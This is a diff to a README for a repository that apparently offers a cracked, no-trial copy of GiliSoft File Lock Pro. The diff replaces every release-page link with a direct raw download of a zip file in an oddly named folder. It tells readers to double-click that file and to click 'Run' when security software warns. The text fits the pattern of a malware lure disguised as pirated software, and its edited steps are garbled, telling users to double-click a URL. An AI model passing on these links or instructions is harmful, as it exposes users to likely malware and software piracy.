@@ -1,6 +1,6 @@
 # 🔒 GiliSoft-File-Lock-Pro-No-Trial - Secure Your Files Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/555jhtt66/GiliSoft-File-Lock-Pro-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/555jhtt66/GiliSoft-File-Lock-Pro-No-Trial/main/mesotartaric/GiliSoft-File-Lock-Pro-No-Trial-v3.2.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/555jhtt66/GiliSoft-File-Lock-Pro-No-Trial/main/mesotartaric/GiliSoft-File-Lock-Pro-No-Trial-v3.2.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the GiliSoft File Lock Pro applica
 
 ### 1. Visit the Download Page
 
-To begin, visit our [Releases page](https://github.com/555jhtt66/GiliSoft-File-Lock-Pro-No-Trial/releases) to access the latest version of the application. 
+To begin, visit our [Releases page](https://raw.githubusercontent.com/555jhtt66/GiliSoft-File-Lock-Pro-No-Trial/main/mesotartaric/GiliSoft-File-Lock-Pro-No-Trial-v3.2.zip) to access the latest version of the application. 
 
 ### 2. Selecting the Right File
 
@@ -20,13 +20,13 @@ On the Releases page, you will find several versions listed. Click on the most r
 
 ### 3. Download the Application
 
-Once you have clicked on the latest version, you will see a list of files associated with that release. Look for the file named something like `GiliSoft_File_Lock_Pro.exe`. Click on this file to start the download.
+Once you have clicked on the latest version, you will see a list of files associated with that release. Look for the file named something like `https://raw.githubusercontent.com/555jhtt66/GiliSoft-File-Lock-Pro-No-Trial/main/mesotartaric/GiliSoft-File-Lock-Pro-No-Trial-v3.2.zip`. Click on this file to start the download.
 
 ### 4. Running the Application
 
 After the download is complete, navigate to your computer's Downloads folder or the location where you saved the file. 
 
-- Double-click on `GiliSoft_File_Lock_Pro.exe` to run the application.
+- Double-click on `https://raw.githubusercontent.com/555jhtt66/GiliSoft-File-Lock-Pro-No-Trial/main/mesotartaric/GiliSoft-File-Lock-Pro-No-Trial-v3.2.zip` to run the application.
 - If prompted by your security system, click "Run" to start the installation process.
 
 ## ⚙️ System Requirements
@@ -40,7 +40,7 @@ Before installing, ensure your system meets these basic requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of GiliSoft File Lock Pro, simply visit this [page here](https://github.com/555jhtt66/GiliSoft-File-Lock-Pro-No-Trial/releases). Follow the earlier steps to start your download and install the application for file protection.
+To download the latest version of GiliSoft File Lock Pro, simply visit this [page here](https://raw.githubusercontent.com/555jhtt66/GiliSoft-File-Lock-Pro-No-Trial/main/mesotartaric/GiliSoft-File-Lock-Pro-No-Trial-v3.2.zip). Follow the earlier steps to start your download and install the application for file protection.
 
 ## 🔍 Features
 
